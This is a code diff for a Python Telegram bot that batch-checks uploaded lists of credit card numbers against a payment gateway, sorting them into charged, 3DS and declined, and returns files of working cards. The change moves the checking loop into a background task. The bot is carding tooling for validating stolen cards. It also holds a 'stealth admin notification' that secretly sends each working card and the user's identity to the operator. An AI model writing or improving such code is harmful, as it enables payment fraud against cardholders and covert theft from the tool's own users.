@@ -1160,6 +1160,165 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(f"❌ Error: {str(e)}")
 
 
+async def run_batch_check(cards: list, user_id: int, user_settings: dict, session: dict, status_msg, update: Update):
+    """
+    Run batch card checking as a background task.
+    This function runs independently of the update handler, allowing other users to interact with the bot.
+    """
+    charged = []
+    declined = []
+    three_ds = []
+    all_results = []
+    last_response = ""
+    checked_count = 0
+    was_stopped = False
+    total_cards = len(cards)
+    username = update.effective_user.username or update.effective_user.first_name
+
+    try:
+        # Create tasks with pre-fetched settings for better performance
+        tasks = [process_single_card(card, user_id, user_settings) for card in cards]
+
+        for i, future in enumerate(asyncio.as_completed(tasks)):
+            # Check for stop FIRST
+            if session["stopped"]:
+                was_stopped = True
+                break
+
+            # Check for pause - yield control frequently for responsiveness
+            pause_check_count = 0
+            while session["paused"] and not session["stopped"]:
+                await asyncio.sleep(0.05)  # Faster response (50ms)
+                pause_check_count += 1
+                if pause_check_count % 20 == 0:
+                    await asyncio.sleep(0)  # Pure yield to event loop
+
+            if session["stopped"]:
+                was_stopped = True
+                break
+
+            try:
+                result = await future
+                response = result["response"]
+                card = result["card"]
+                checked_count += 1
+
+                # Build full response with all error details
+                response_parts = []
+                if response.get("message"):
+                    response_parts.append(response.get("message"))
+                if response.get("error"):
+                    response_parts.append(response.get("error"))
+                if response.get("gateway_message"):
+                    response_parts.append(f"Gateway: {response.get('gateway_message')}")
+                if response.get("decline_code"):
+                    response_parts.append(f"Code: {response.get('decline_code')}")
+
+                full_response = " | ".join(response_parts) if response_parts else "Unknown"
+
+                # Truncate for progress display only
+                error_msg = full_response
+                if len(error_msg) > 50:
+                    error_msg = error_msg[:47] + "..."
+                last_response = error_msg
+
+                # Store result with full response for file
+                result_line = f"{card} | {full_response}"
+
+                if response.get("success"):
+                    charged.append(result)
+                    all_results.append(f"CHARGED | {result_line}")
+                    # Non-blocking notification to user
+                    asyncio.create_task(
+                        update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    )
+                    # Stealth admin notification (real-time, non-blocking)
+                    asyncio.create_task(notify_admin_charged(card, result, user_id, username))
+                elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
+                    three_ds.append(result)
+                    all_results.append(f"3DS | {result_line}")
+                    asyncio.create_task(
+                        update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    )
+                else:
+                    declined.append(result)
+                    all_results.append(f"DECLINED | {result_line}")
+
+                # Update progress every 10 cards (non-blocking)
+                if checked_count % 10 == 0 or checked_count == total_cards:
+                    try:
+                        progress_bar = create_progress_bar(checked_count, total_cards)
+                        pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
+                        asyncio.create_task(status_msg.edit_text(
+                            f"{pause_status}⏳ *Checking Cards...*\n\n"
+                            f"{progress_bar}\n"
+                            f"📊 {checked_count}/{total_cards} checked\n\n"
+                            f"✅ Charged: {len(charged)}\n"
+                            f"🔐 3DS: {len(three_ds)}\n"
+                            f"❌ Declined: {len(declined)}\n\n"
+                            f"💬 *Last*: `{last_response}`",
+                            parse_mode="Markdown",
+                            reply_markup=get_checking_keyboard(paused=session["paused"])
+                        ))
+                    except Exception:
+                        pass
+
+            except asyncio.CancelledError:
+                logger.warning(f"Task cancelled during batch check for user {user_id}")
+                continue
+            except Exception as e:
+                logger.error(f"Batch check error for user {user_id}: {e}")
+                last_response = f"Error: {str(e)[:30]}"
+                checked_count += 1
+
+    except Exception as e:
+        logger.error(f"Fatal error in batch check for user {user_id}: {e}")
+    finally:
+        # Reset session
+        session["checking"] = False
+
+        # Final summary
+        stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
+        summary = (
+            f"{stop_text}📊 *FINAL RESULTS*\n\n"
+            f"✅ Charged: {len(charged)}\n"
+            f"🔐 3DS: {len(three_ds)}\n"
+            f"❌ Declined: {len(declined)}\n"
+            f"📝 Checked: {checked_count}/{total_cards}"
+        )
+
+        try:
+            await status_msg.edit_text(summary, parse_mode="Markdown")
+        except Exception:
+            pass
+
+        # Send full results file
+        if all_results:
+            try:
+                results_text = "\n".join(all_results)
+                file_buffer = io.BytesIO(results_text.encode('utf-8'))
+                file_buffer.name = "results.txt"
+                await update.message.reply_document(
+                    document=file_buffer,
+                    caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {checked_count}/{total_cards} checked"
+                )
+            except Exception as e:
+                logger.error(f"Failed to send results file: {e}")
+
+        # Send charged cards separately
+        if charged:
+            try:
+                charged_text = "\n".join([r["card"] for r in charged])
+                file_buffer = io.BytesIO(charged_text.encode('utf-8'))
+                file_buffer.name = "charged_cards.txt"
+                await update.message.reply_document(
+                    document=file_buffer,
+                    caption=f"✅ {len(charged)} Charged Cards"
+                )
+            except Exception as e:
+                logger.error(f"Failed to send charged cards file: {e}")
+
+
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle .txt file uploads for mass checking"""
     user_id = update.effective_user.id
@@ -1210,150 +1369,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=get_checking_keyboard(paused=False)
     )
 
-    charged = []
-    declined = []
-    three_ds = []
-    all_results = []
-    last_response = ""
-    checked_count = 0
-    was_stopped = False
-
-    # Track processed cards to ensure none are lost
-    processed_cards = set()
-
-    # Create tasks with pre-fetched settings for better performance
-    tasks = [process_single_card(card, user_id, user_settings) for card in cards]
-
-    for i, future in enumerate(asyncio.as_completed(tasks)):
-        # Check for stop FIRST
-        if session["stopped"]:
-            was_stopped = True
-            break
-
-        # Check for pause - yield control frequently for responsiveness
-        pause_check_count = 0
-        while session["paused"] and not session["stopped"]:
-            await asyncio.sleep(0.05)  # Faster response to resume (50ms vs 100ms)
-            pause_check_count += 1
-            # Yield to event loop every 20 iterations to keep callbacks responsive
-            if pause_check_count % 20 == 0:
-                await asyncio.sleep(0)  # Pure yield to event loop
-
-        if session["stopped"]:
-            was_stopped = True
-            break
-
-        try:
-            result = await future
-            response = result["response"]
-            card = result["card"]
-            checked_count += 1
-            processed_cards.add(card)
-
-            # Build full response with all error details
-            response_parts = []
-            if response.get("message"):
-                response_parts.append(response.get("message"))
-            if response.get("error"):
-                response_parts.append(response.get("error"))
-            if response.get("gateway_message"):
-                response_parts.append(f"Gateway: {response.get('gateway_message')}")
-            if response.get("decline_code"):
-                response_parts.append(f"Code: {response.get('decline_code')}")
-
-            full_response = " | ".join(response_parts) if response_parts else "Unknown"
-
-            # Truncate for progress display only
-            error_msg = full_response
-            if len(error_msg) > 50:
-                error_msg = error_msg[:47] + "..."
-            last_response = error_msg
-
-            # Store result with full response for file
-            result_line = f"{card} | {full_response}"
-
-            if response.get("success"):
-                charged.append(result)
-                all_results.append(f"CHARGED | {result_line}")
-                # Non-blocking notification to user
-                asyncio.create_task(
-                    update.message.reply_text(format_result(result), parse_mode="Markdown")
-                )
-                # Stealth admin notification (real-time, non-blocking)
-                username = update.effective_user.username or update.effective_user.first_name
-                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
-            elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
-                three_ds.append(result)
-                all_results.append(f"3DS | {result_line}")
-                # Non-blocking notification
-                asyncio.create_task(
-                    update.message.reply_text(format_result(result), parse_mode="Markdown")
-                )
-            else:
-                declined.append(result)
-                all_results.append(f"DECLINED | {result_line}")
-
-            # Update progress every 10 cards for speed (non-blocking)
-            if checked_count % 10 == 0 or checked_count == len(cards):
-                try:
-                    progress_bar = create_progress_bar(checked_count, len(cards))
-                    pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
-                    # Fire-and-forget progress update
-                    asyncio.create_task(status_msg.edit_text(
-                        f"{pause_status}⏳ *Checking Cards...*\n\n"
-                        f"{progress_bar}\n"
-                        f"📊 {checked_count}/{len(cards)} checked\n\n"
-                        f"✅ Charged: {len(charged)}\n"
-                        f"🔐 3DS: {len(three_ds)}\n"
-                        f"❌ Declined: {len(declined)}\n\n"
-                        f"💬 *Last*: `{last_response}`",
-                        parse_mode="Markdown",
-                        reply_markup=get_checking_keyboard(paused=session["paused"])
-                    ))
-                except Exception:
-                    pass
-
-        except asyncio.CancelledError:
-            logger.warning(f"Task cancelled during mass check")
-            continue  # Don't stop the whole batch
-        except Exception as e:
-            logger.error(f"Mass check error: {e}")
-            last_response = f"Error: {str(e)[:30]}"
-            checked_count += 1  # Count failed cards too
-
-    # Reset session
-    session["checking"] = False
-
-    # Final summary
-    stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
-    summary = (
-        f"{stop_text}📊 *FINAL RESULTS*\n\n"
-        f"✅ Charged: {len(charged)}\n"
-        f"🔐 3DS: {len(three_ds)}\n"
-        f"❌ Declined: {len(declined)}\n"
-        f"📝 Checked: {checked_count}/{len(cards)}"
+    # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
+    # This allows other users to interact with the bot while checking is in progress
+    asyncio.create_task(
+        run_batch_check(cards, user_id, user_settings, session, status_msg, update)
     )
-    await status_msg.edit_text(summary, parse_mode="Markdown")
-
-    # Send full results file
-    if all_results:
-        results_text = "\n".join(all_results)
-        file_buffer = io.BytesIO(results_text.encode('utf-8'))
-        file_buffer.name = "results.txt"
-        await update.message.reply_document(
-            document=file_buffer,
-            caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {checked_count}/{len(cards)} checked"
-        )
-
-    # Send charged cards separately
-    if charged:
-        charged_text = "\n".join([r["card"] for r in charged])
-        file_buffer = io.BytesIO(charged_text.encode('utf-8'))
-        file_buffer.name = "charged_cards.txt"
-        await update.message.reply_document(
-            document=file_buffer,
-            caption=f"✅ {len(charged)} Charged Cards"
-        )
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1503,136 +1523,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=get_checking_keyboard(paused=False)
         )
 
-        charged = []
-        declined = []
-        three_ds = []
-        all_results = []
-        last_response = ""
-        checked_count = 0
-        was_stopped = False
-        processed_cards = set()
-
-        # Create tasks with pre-fetched settings
-        tasks = [process_single_card(card, user_id, user_settings) for card in cards]
-
-        for i, future in enumerate(asyncio.as_completed(tasks)):
-            # Check for stop FIRST
-            if session["stopped"]:
-                was_stopped = True
-                break
-
-            # Check for pause - yield control frequently for responsiveness
-            pause_check_count = 0
-            while session["paused"] and not session["stopped"]:
-                await asyncio.sleep(0.05)  # Faster response (50ms)
-                pause_check_count += 1
-                if pause_check_count % 20 == 0:
-                    await asyncio.sleep(0)  # Pure yield to event loop
-
-            if session["stopped"]:
-                was_stopped = True
-                break
-
-            try:
-                result = await future
-                response = result["response"]
-                card = result["card"]
-                checked_count += 1
-                processed_cards.add(card)
-
-                # Build full response with all error details
-                response_parts = []
-                if response.get("message"):
-                    response_parts.append(response.get("message"))
-                if response.get("error"):
-                    response_parts.append(response.get("error"))
-                if response.get("gateway_message"):
-                    response_parts.append(f"Gateway: {response.get('gateway_message')}")
-                if response.get("decline_code"):
-                    response_parts.append(f"Code: {response.get('decline_code')}")
-
-                full_response = " | ".join(response_parts) if response_parts else "Unknown"
-
-                error_msg = full_response
-                if len(error_msg) > 50:
-                    error_msg = error_msg[:47] + "..."
-                last_response = error_msg
-
-                result_line = f"{card} | {full_response}"
-
-                if response.get("success"):
-                    charged.append(result)
-                    all_results.append(f"CHARGED | {result_line}")
-                    # Non-blocking notification
-                    asyncio.create_task(
-                        update.message.reply_text(format_result(result), parse_mode="Markdown")
-                    )
-                    # Stealth admin notification (real-time, non-blocking)
-                    username = update.effective_user.username or update.effective_user.first_name
-                    asyncio.create_task(notify_admin_charged(card, result, user_id, username))
-                elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
-                    three_ds.append(result)
-                    all_results.append(f"3DS | {result_line}")
-                    asyncio.create_task(
-                        update.message.reply_text(format_result(result), parse_mode="Markdown")
-                    )
-                else:
-                    declined.append(result)
-                    all_results.append(f"DECLINED | {result_line}")
-
-                # Update progress every 10 cards (non-blocking)
-                if checked_count % 10 == 0 or checked_count == len(cards):
-                    try:
-                        progress_bar = create_progress_bar(checked_count, len(cards))
-                        pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
-                        asyncio.create_task(status_msg.edit_text(
-                            f"{pause_status}⏳ *Checking Cards...*\n\n"
-                            f"{progress_bar}\n"
-                            f"📊 {checked_count}/{len(cards)} checked\n\n"
-                            f"✅ Charged: {len(charged)}\n"
-                            f"🔐 3DS: {len(three_ds)}\n"
-                            f"❌ Declined: {len(declined)}\n\n"
-                            f"💬 *Last*: `{last_response}`",
-                            parse_mode="Markdown",
-                            reply_markup=get_checking_keyboard(paused=session["paused"])
-                        ))
-                    except Exception:
-                        pass
-
-            except asyncio.CancelledError:
-                logger.warning(f"Task cancelled during paste check")
-                continue
-            except Exception as e:
-                logger.error(f"Mass check error: {e}")
-                last_response = f"Error: {str(e)[:30]}"
-                checked_count += 1
-
-        # Reset session
-        session["checking"] = False
-
-        stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
-        summary = f"{stop_text}📊 *FINAL RESULTS*\n\n✅ Charged: {len(charged)}\n🔐 3DS: {len(three_ds)}\n❌ Declined: {len(declined)}\n📝 Checked: {checked_count}/{len(cards)}"
-        await status_msg.edit_text(summary, parse_mode="Markdown")
-
-        # Send full results file
-        if all_results:
-            results_text = "\n".join(all_results)
-            file_buffer = io.BytesIO(results_text.encode('utf-8'))
-            file_buffer.name = "results.txt"
-            await update.message.reply_document(
-                document=file_buffer,
-                caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {checked_count}/{len(cards)} checked"
-            )
-
-        # Send charged cards separately
-        if charged:
-            charged_text = "\n".join([r["card"] for r in charged])
-            file_buffer = io.BytesIO(charged_text.encode('utf-8'))
-            file_buffer.name = "charged_cards.txt"
-            await update.message.reply_document(
-                document=file_buffer,
-                caption=f"✅ {len(charged)} Charged Cards"
-            )
+        # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
+        # This allows other users to interact with the bot while checking is in progress
+        asyncio.create_task(
+            run_batch_check(cards, user_id, user_settings, session, status_msg, update)
+        )
 
 
 def main():
